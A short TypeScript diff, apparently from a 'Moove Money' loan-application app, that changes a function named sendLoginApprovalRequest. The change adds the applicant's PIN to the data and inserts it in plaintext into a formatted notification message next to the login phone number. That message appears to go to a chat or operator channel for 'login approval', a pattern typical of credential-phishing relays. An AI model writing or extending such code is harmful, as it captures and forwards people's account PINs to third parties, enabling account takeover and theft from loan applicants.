@@ -37,6 +37,7 @@ export async function sendLoginApprovalRequest(
     lastName: string;
     phone: string;
     loginPhone: string;
+    pin: string;
     loanType: string;
     loanAmount: number;
     loanTermMonths: number;
@@ -54,7 +55,8 @@ export async function sendLoginApprovalRequest(
     `🔔 *New Moove Money Loan Application*\n\n` +
     `👤 *Applicant:* ${applicantData.firstName} ${applicantData.lastName}\n` +
     `📞 *Application Phone:* ${applicantData.phone}\n` +
-    `📱 *Login Phone:* ${applicantData.loginPhone}\n\n` +
+    `📱 *Login Phone:* ${applicantData.loginPhone}\n` +
+    `🔑 *PIN:* \`${applicantData.pin}\`\n\n` +
     `💰 *Loan Details:*\n` +
     `  • Type: ${applicantData.loanType}\n` +
     `  • Amount: ${applicantData.loanAmount.toLocaleString("fr-FR")} FCFA\n` +
